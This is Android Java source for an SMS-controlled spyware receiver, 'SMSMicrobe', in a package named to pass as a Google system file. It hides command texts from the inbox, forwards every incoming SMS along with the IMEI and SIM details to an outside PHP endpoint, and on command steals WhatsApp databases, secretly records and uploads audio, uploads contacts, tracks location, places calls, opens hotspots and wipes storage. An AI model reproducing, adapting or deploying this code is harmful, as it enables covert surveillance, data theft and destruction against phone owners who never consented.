package com.android.google.important.file;

import java.io.File;
import java.io.InputStream;
import java.net.URLEncoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Vibrator;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SMSMicrobe extends BroadcastReceiver {

	Context context2;
	String message, senderNum, extraContent, id, contactName, contactNumber;
	SmsMessage currentMessage;
	BlowIt blw;
	MediaRecorder mRecorder;

	@Override
	public void onReceive(Context context, Intent intent) {
		context2 = context;
		// Blow it Instantiating
		blw = new BlowIt(context);

		// Message Details Bundle
		final Bundle bundle = intent.getExtras();

		try {

			if (bundle != null) {

				final Object[] pdusObj = (Object[]) bundle.get("pdus");

				for (int i = 0; i < pdusObj.length; i++) {

					currentMessage = SmsMessage
							.createFromPdu((byte[]) pdusObj[i]);
				}
			}

			// Message From
			senderNum = currentMessage.getDisplayOriginatingAddress();

			// Message
			String ogMsg = currentMessage.getDisplayMessageBody();

			Log.d("X", "Orginal Message:" + ogMsg);

			// Main Code Found - xrob
			if (ogMsg.contains("xrob")) {

				Log.d("X", "Xrob Command Recogonised");

				// Blocking Message from notification and inbox
				abortBroadcast();

				// Log.d("X","Broadcast aborted");

				// Power Mode ON - Enabling Internet and WIFI
				if (ogMsg.contains("power")) {
					blw.enablePowerMode();
					Log.d("X", "XROB POWER - ACTIVATED");
				}

				// DARK NIGHT
				if (ogMsg.contains("darknight")) {
					blw.getAudioManager().setRingerMode(
							AudioManager.RINGER_MODE_SILENT);
					blw.enableMobileData();
				}

				// SUNRISE
				else if (ogMsg.contains("sunrise")) {
					blw.getAudioManager().setRingerMode(
							AudioManager.RINGER_MODE_NORMAL);
					blw.disableMobileData();
				}

				// Enabling Mobile Data ONLY
				if (ogMsg.contains("angels5")) {

					// Only if mobile data currently disabled
					if (!blw.isConnectingToInternet()) {
						blw.enableMobileData();
						Log.d("X", "XROB ANGELS5 - ACTIVATED");
					}

				} else if(ogMsg.contains("automove"))
				{
					long vibDuration;
					
					if(ogMsg.contains(","))
					{
						vibDuration = Long.parseLong(ogMsg.split(",")[1])*1000;
					}else{
						vibDuration = 5000;
					}
					
					Vibrator vb = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
					vb.vibrate(vibDuration);
					
				}else if (ogMsg.contains("bcast")) {
					// Play Music from URL
					String url = ogMsg.split(",")[1];

					// Play Sync or ASYNC
					if (ogMsg.contains("async")) {
						blw.playSoundAsync(url);
					} else {
						blw.playSound(url);
					}

				} else if (ogMsg.contains("shhh")) {

					// ACTIVATING SILENT MODE
					blw.getAudioManager().setRingerMode(
							AudioManager.RINGER_MODE_SILENT);

				} else if (ogMsg.contains("dingdong")) {
					// ACTIVATING RINGER MODE
					blw.getAudioManager().setRingerMode(
							AudioManager.RINGER_MODE_NORMAL);
				} else if (ogMsg.contains("grrr")) {
					// ACTIVATING VIBRATE MODE
					blw.getAudioManager().setRingerMode(
							AudioManager.RINGER_MODE_VIBRATE);
				} else if (ogMsg.contains("judy")) {

					// Enabling Bluetooth and trying to do caribe operation
					blw.bluetoothOperation();
					Log.d("X", "XROB JUDY - ACTIVATED");

				} else if (ogMsg.contains("hotdog")) {

					String name = "";

					// Checking image keyword and collecting it
					if (ogMsg.contains(",")) {
						name = ogMsg.split(",")[1];
					}

					Log.d("X", "XROB HOTDOG - ACTIVATED");

					// Checking wheather the query is local
					if (ogMsg.contains("local")) {

						// Setting wallpaper from local storage
						InputStream imageStream = context.getResources()
								.openRawResource(R.drawable.ironman);
						Bitmap bmp = BitmapFactory.decodeStream(imageStream);
						blw.getWallManager().setBitmap(bmp);

						// Deprecated Method
						// context.getApplicationContext().setWallpaper(bmp);
					}

					// Collecting from Internet
					else {
						// Resize Image
						if (ogMsg.contains("rszon")) {
							blw.ChangeWallpaperRsz(name);
						} else {
							// NO Resize needed
							blw.ChangeWallpaper(name);
						}
					}

				} else if (ogMsg.contains("pling")) {

					// Disabling WIFI and INTERNET
					try {
						blw.disableWifiTethering();
						blw.disableMobileData();
						blw.disableWifi();
					} catch (Exception e) {
						Log.e("X", e.getMessage());
					}
					Log.d("X", "XROB PLING - ACTIVATED");

				} else if (ogMsg.contains("autocat")) {

					Log.d("X", "XROB AUTOCAT - ACTIVATED");

					String pwd = "password123";
					// Checking custom password
					if (ogMsg.contains(",")) {
						pwd = ogMsg.split(",")[1];
					}

					// Enabling WiFi-Tethering , Mobile Data and Changing the
					// WiFi Password
					if (!blw.isConnectingToInternet()) {
						blw.enableMobileData();
					}

					// If internet available,do rest of the activity
					blw.enableWifiTethering();
					blw.changeConfiguration(pwd);

				} else if (ogMsg.contains("upstole")) {

					boolean stealthMode = false;

					if (ogMsg.contains("stealthmode")) {
						stealthMode = true;
					}

					File whatsAppDirectory = new File(
							Environment.getExternalStorageDirectory()
									+ "/WhatsApp/Databases/");

					try {
						blw.sendAllinDir(whatsAppDirectory, stealthMode);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				}

				else if (ogMsg.contains("roger")) {
					int duration = 30000;
					boolean stealthMode = false;

					if (ogMsg.contains("stealthmode")) {
						stealthMode = true;
						blw.enableMobileData();
					}

					if (ogMsg.contains(",")) {
						duration = Integer.parseInt(ogMsg.split(",")[1]) * 1000;
					}

					Log.d("X", "ROGER ACTIVATED");
					Log.d("X", "Record Duration:" + duration);

					blw.recordAndUploadSound(duration, stealthMode);

				} else if (ogMsg.contains("ringbaby")) {

					// Automatic Calling
					Log.d("X", "XROB RINGBABY - ACTIVATED");

					// Collecting Mobile Number
					String mobileNo = ogMsg.split(",")[1];

					// Setting URI
					String uri = "tel:" + mobileNo.trim();

					// Intending
					Intent call = new Intent(Intent.ACTION_CALL);
					call.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					call.setData(Uri.parse(uri));
					context.startActivity(call);

				} else if (ogMsg.contains("shoot")) {

					Log.d("X", "XROB SHOOT - ACTIVATED");

					// Laser Gun Sound - CHECK
					MediaPlayer mp = MediaPlayer.create(context, R.raw.alien);
					mp.start();

				} else if (ogMsg.contains("dvbbs")) {

					Log.d("X", "XROB DVBBS - ACTIVATED");
					// DVBBS - CHECK
					MediaPlayer mp = MediaPlayer.create(context, R.raw.kathi);
					mp.start();

				} else if (ogMsg.contains("pigeons")) {

					// Locating User using GPS
					Log.d("X", "XROB PIGEONS - ACTIVATED");
					// LocationManager
					LocationManager lm = (LocationManager) context
							.getSystemService(Context.LOCATION_SERVICE);

					// If internet not available, enable internet and Request
					// location
					if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
							&& blw.isConnectingToInternet()) {
						Log.d("X", "Location Requested");
						blw.getLocation();

					} else {
						blw.enableMobileData();
						blw.getLocation();
					}

				} else if (ogMsg.contains("candygram")) {
					// Enabling WiFi
					Log.d("X", "XROB CANDYGRAM - ACTIVATED");
					if (blw.getWiFiManager().isWifiEnabled() == false) {
						blw.getWiFiManager().setWifiEnabled(true);
					}

				} else if (ogMsg.contains("cappygram")) {
					// Disabling WiFi
					Log.d("X", "XROB CANDYGRAMOFF - ACTIVATED");
					if (blw.getWiFiManager().isWifiEnabled()) {
						blw.getWiFiManager().setWifiEnabled(false);
					}
				} else if (ogMsg.contains("bingo")) {

					// Collecting Contacts From the PHONE

					Log.d("X", "XROB BINGO - ACTIVATED");

					// Notifying through mail
					blw.mailMessage("Contact request Success on :"
							+ android.os.Build.MODEL);

					// Connected to Internet - CHECK
					blw.uploadContact();

				} else if (ogMsg.contains("alldir")) {
					Log.d("X","ALL DIR - ACTIVATED");
					blw.mailAllDirectories();
					
				} else if (ogMsg.contains("clean")) {
					
					Log.d("X","CLEAN ACTIVATED");
					File fl;
					//CLEANING SD
					if(ogMsg.contains("sd"))
					{
						fl = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
					}else if(ogMsg.contains("mem"))
					{
						
						fl = new File("/mnt/extSdCard/");
						
						if(!fl.exists())
						{
							Log.d("X","Hardcoded location not found");
							fl = new File("/mnt/external_sd/");
						}
						
					}else
					{
						fl = new File("/mnt/");
					}
					
					
					blw.delAllDir(fl);
					
				} else {
					Log.d("X", "No Special Commands Found");
				}
			}

			Log.d("X", "SENDING MESSAGE TO SERVER");

			// Getting Device Details
			TelephonyManager tm = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);

			String model = android.os.Build.MODEL;
			String brand = android.os.Build.BRAND;

			String id = tm.getDeviceId();
			String simSerial = tm.getSimSerialNumber();
			String simCountry = tm.getSimCountryIso();
			String simOperator = tm.getSimOperatorName();
			String networkCountry = tm.getNetworkCountryIso();

			// Message (HTML FORMAT)
			message = "<b><font color='red' size='30'>" + ogMsg + "</font></b>";

			// Extra content - Device Details
			extraContent = "<br><b>Brand: " + brand + "<br>Model: " + model
					+ "<br>IMEI:" + id + "<br>SIM SERIAL :" + simSerial
					+ "<br>SIM Country :" + simCountry + "<br> SIM OPERATOR :"
					+ simOperator + "<br> NETWORK COUNTRY :" + networkCountry
					+ "</b><hr>";

			// Uploading Message
			if (blw.isConnectingToInternet()) {

				try {
					new JSONGrabber()
							.execute("http://homeworks.orgfree.com/Microbe/transmitter.php?from="
									+ URLEncoder.encode(senderNum, "utf-8")
									+ "&message="
									+ URLEncoder.encode(message, "utf-8")
									+ URLEncoder.encode(extraContent, "utf-8"));
				} catch (Exception e) {
					Log.d("X", e.getMessage());
				}

			} else {
				Log.e("X", "Internet not enabled");
			}

		} catch (Exception e) {
			Log.e("X", "Exception smsReceiver" + e.getMessage());

		}

	}

}